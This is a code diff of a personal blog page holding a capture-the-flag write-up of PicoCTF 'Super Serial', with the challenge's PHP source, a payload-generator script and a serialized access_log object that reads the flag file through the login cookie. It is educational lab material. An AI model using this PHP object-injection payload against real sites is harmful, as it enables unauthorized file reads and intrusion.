@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Writeup | p0nther</title>
+    <title>Writeup: Super Serial | p0nther</title>
     <link rel="stylesheet" href="style.css">
 </head>
 
@@ -14,7 +14,7 @@
         <nav>
             <a href="index.html">~/home</a>
             <a href="#">~/writeups</a>
-            <a href="#">~/payloads</a>
+            <a href="payloads.html">~/payloads</a>
             <a href="#">~/about</a>
         </nav>
     </header>
@@ -25,40 +25,97 @@
         </div>
         <h1>PicoCTF: Super Serial</h1>
 
-        <p>This challenge involves exploiting a PHP Object Injection vulnerability. The application uses `serialize()`
-            and `unserialize()` on user-controlled data without proper validation.</p>
+        <p>This challenge involves exploiting a PHP Object Injection vulnerability. The application uses
+            <code>serialize()</code> and <code>unserialize()</code> on user-controlled data without proper validation.
+        </p>
 
-        <h2>Reconnaissance</h2>
-        <p>Upon visiting the site, we see a login form. Checking the source code reveals a hint about `robots.txt`.</p>
+        <h2>Source Code Analysis</h2>
 
-        <pre><code>User-agent: *
-Disallow: /admin.phps
-Disallow: /super-secret-flag.txt</code></pre>
+        <h3>1. Entry Point: index.php</h3>
+        <p>The login page handles user credentials. If valid, it serializes a <code>UserPermissions</code> object,
+            encodes it, and sets it as a cookie.</p>
+        <pre><code>&lt;?php
+require_once("cookie.php");
 
-        <p>We can try to access `index.phps` to see the source code of the index page.</p>
+if (isset($_POST["user"]) && isset($_POST["pass"])) {
+	$con = new SQLite3("../users.db");
+	$username = $_POST["user"];
+	$password = $_POST["pass"];
+	$perm_res = new UserPermissions($username, $password);
+	if ($perm_res->is_guest() || $perm_res->is_admin()) {
+		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
+		header("Location: authentication.php");
+		die();
+	} else {
+		$msg = '&lt;h6 class="text-center" style="color:red"&gt;Invalid Login.&lt;/h6&gt;';
+	}
+}
+?&gt;</code></pre>
 
-        <h2>Exploitation</h2>
-        <p>The code reveals a class `access_log` with a `__toString` method that reads a file. If we can inject a
-            serialized object of this class, we can trigger the file read.</p>
-
-        <pre><code>class access_log {
+        <h3>2. The Gadget: authN.php</h3>
+        <p>This file contains the <code>access_log</code> class. The <code>__toString()</code> magic method reads the
+            file specified in <code>$log_file</code>. This is our gadget.</p>
+        <pre><code>class access_log
+{
     public $log_file;
 
-    function __construct($lf) {
+    public function __construct($lf)
+    {
         $this->log_file = $lf;
     }
 
-    function __toString() {
-        return read_file($this->log_file);
+    public function __toString()
+    {
+        return $this->read_log();
+    }
+
+    public function read_log()
+    {
+        return file_get_contents($this->log_file);
     }
 }</code></pre>
 
-        <p>We craft a payload to read `../flag.txt`.</p>
+        <h3>3. The Vulnerability: cookies.php</h3>
+        <p>This file handles the deserialization of the cookie. If we can control the cookie, we can inject an object.
+        </p>
+        <pre><code>if (isset($_COOKIE["login"])) {
+    try {
+        $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
+        $g = $perm->is_guest();
+        $a = $perm->is_admin();
+    } catch (Error $e) {
+        die("Deserialization error. " . $e->getMessage());
+    }
+}</code></pre>
 
-        <h2>Payload</h2>
-        <pre><code>O:10:"access_log":1:{s:8:"log_file";s:11:"../flag.txt";}</code></pre>
+        <h2>Exploitation Strategy</h2>
+        <p>We need to create a serialized <code>access_log</code> object where <code>$log_file</code> points to
+            <code>../flag</code>. When the application tries to use this object (likely triggering
+            <code>__toString</code> during an error or string operation), it will read the flag.
+        </p>
 
-        <p>Encoding this payload and sending it via the cookie results in the flag being printed.</p>
+        <h3>Payload Generator (payload.php)</h3>
+        <p>I wrote this script to generate the malicious serialized object.</p>
+        <pre><code>&lt;?php
+class access_log
+{
+    public $log_file;
+}
+
+$my_object = new access_log();
+$my_object->log_file = "../flag";
+
+$serialized_string = serialize($my_object);
+echo $serialized_string;
+?&gt;</code></pre>
+
+        <p><strong>Output:</strong> <code>O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}</code></p>
+
+        <h2>Execution</h2>
+        <p>1. Encode the payload: Base64 encode and URL encode the serialized string.<br>
+            2. Set the <code>login</code> cookie to this value.<br>
+            3. Refresh the page. The application will try to deserialize it. If it treats the object as a string (or if
+            we force an error that prints it), the <code>__toString</code> method triggers, reading the flag.</p>
 
         <div style="margin-top: 3rem; border-top: 1px dashed #333; padding-top: 1rem;">
             <a href="index.html" class="card-link"><- BACK_TO_ROOT</a>
@@ -66,8 +123,8 @@ Disallow: /super-secret-flag.txt</code></pre>
     </article>
 
     <footer>
-        <p>&copy; 2025 0xHACKER. All rights reserved. <br> <span
-                style="color: var(--accent-color)">root@localhost</span></p>
+        <p>&copy; 2025 p0nther. All rights reserved. <br> <span style="color: var(--accent-color)">root@localhost</span>
+        </p>
     </footer>
 </body>
 
